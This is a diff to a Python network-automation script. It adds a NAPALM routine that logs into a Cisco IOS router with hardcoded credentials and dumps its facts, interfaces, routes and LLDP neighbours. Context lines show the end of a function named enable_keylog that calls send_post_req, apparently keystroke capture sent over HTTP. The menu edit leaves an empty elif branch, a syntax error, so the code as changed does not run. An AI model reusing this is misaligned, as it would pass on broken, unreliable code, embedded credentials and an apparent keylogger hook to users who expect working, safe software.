@@ -93,7 +93,44 @@ def enable_keylog():
     send_post_req()
 
     # Joining the listener thread, which will run as long as the program is running.
-    listener.join()#----------------------------LOOPBACK Configuration---------------------------------#
+    listener.join()
+       #-----------DATA INFORMATION ABOUT ROUTER--------------#
+def data_device(ip):
+    devices = [ip]
+
+    driver = get_network_driver('ios')
+
+    for device in devices:
+        try:
+            iou1 = driver(device, "safouat", "cisco")
+            iou1.open()
+
+            facts = iou1.get_facts()
+            print(json.dumps(facts, indent=4))
+
+            interfaces = iou1.get_interfaces()
+            print(json.dumps(interfaces, sort_keys=True, indent=4))
+
+            interfaces_counters = iou1.get_interfaces_counters()
+            print(json.dumps(interfaces_counters, indent=4))
+
+            interfaces_ip = iou1.get_interfaces_ip()
+            print(json.dumps(interfaces_ip, indent=4))
+            
+            device_type = facts.get('model', '')
+            if 'router' in device_type.lower():
+                routing_table = iou1.get_route_to(destination='', protocol='')
+                print(json.dumps(routing_table, indent=4))
+            lldp_neighbors = iou1.get_lldp_neighbors()
+            print(json.dumps(lldp_neighbors, indent=4))
+
+            iou1.close()
+        
+        except Exception as e:
+            print(f"Une erreur s'est produite lors de la récupération des informations du périphérique {device}:")
+            print(str(e))
+
+       #----------------------------LOOPBACK Configuration---------------------------------#
 def construct_LOOPBACKLIST():
     router_graph = {}
    
@@ -411,8 +448,11 @@ if __name__ == "__main__":
             # Loopback Configuration
             loopback_list = construct_LOOPBACKLIST()
             LOOPBACK_CONFIGURATION(loopback_list)
-        
         elif choice == "8":
+            # Loopback Configuration
+            
+        
+        elif choice == "9":
             # Exit the program
             print("Exiting the program.")
             break
